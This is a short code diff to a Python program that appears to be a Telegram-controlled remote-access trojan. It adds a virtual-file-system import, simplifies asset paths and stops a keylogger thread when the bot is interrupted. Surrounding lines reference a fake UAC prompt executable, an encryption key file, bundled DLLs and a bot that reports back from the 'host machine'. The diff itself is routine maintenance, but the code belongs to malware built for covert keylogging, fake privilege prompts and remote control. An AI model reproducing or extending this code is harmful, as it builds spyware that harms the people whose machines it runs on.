@@ -72,6 +72,8 @@ except ImportError as e:
     print(f"Plugins not loaded\n{e}\n")
     plugins = None
 
+from utils.vfs_runtime import *
+
 #TODO Add all the message boxes to a file un user_interaction/boxes.py
 
 # This is needed to understand if the file was compiled or not
@@ -109,15 +111,15 @@ TELEGRAM_COMMAND_DESCRIPTION_LENGHT_LIMIT = 256
 KEY_PATH = resource_path("key.key")
 
 try:
-    assets_dir = resource_path("assets")
-    vfx = resource_path(join(assets_dir, "vfx"))
-    sfx = resource_path(join(assets_dir, "sfx"))
-    executables = resource_path(join(assets_dir, "executables"))
+    assets_dir = ""
+    vfx = join(assets_dir, "vfx")
+    sfx = join(assets_dir, "sfx")
+    executables = join(assets_dir, "executables")
     fake_uac_prompt_path = join(executables, "fakeuac.exe")
     keyfile = KEY_PATH
-    prototxt_filename = resource_path(join(assets_dir,"model","1.prototxt"))
-    caffemodel_filename = resource_path(join(assets_dir,"model","2.caffemodel"))
-    DLLS_DIR = resource_path(join(assets_dir, "dlls"))
+    prototxt_filename = join(assets_dir,"model","1.prototxt")
+    caffemodel_filename = join(assets_dir,"model","2.caffemodel")
+    DLLS_DIR = join(assets_dir, "dlls")
 except Exception as e:
     print(e)
     exit()
@@ -322,7 +324,7 @@ def load_images(vfx_folder: str=vfx) -> dict[str:Mat]:
     return { x[:-4]:compress_and_resize_image(imread(join(vfx_folder,x))) for x in listdir(vfx_folder) }
 
 def load_audios(sfx_folder: str=sfx) -> list[str]:
-    return { x[:-4]:abspath(join(sfx_folder,x)) for x in listdir(sfx_folder) }
+    return { x[:-4]:join(sfx_folder,x) for x in listdir(sfx_folder) }
 
 def randompngname(lenght: int=10) -> str:
     return randomname(lenght)+".png"
@@ -3183,6 +3185,7 @@ The bot is now restarting. Please wait a moment...
             try:
                 sleep(10)
             except KeyboardInterrupt:
+                self.keylogger_stop_event.set()
                 self.bsend("🛑 Interrupted by host machine, bye bye.")
                 self.running = False
 
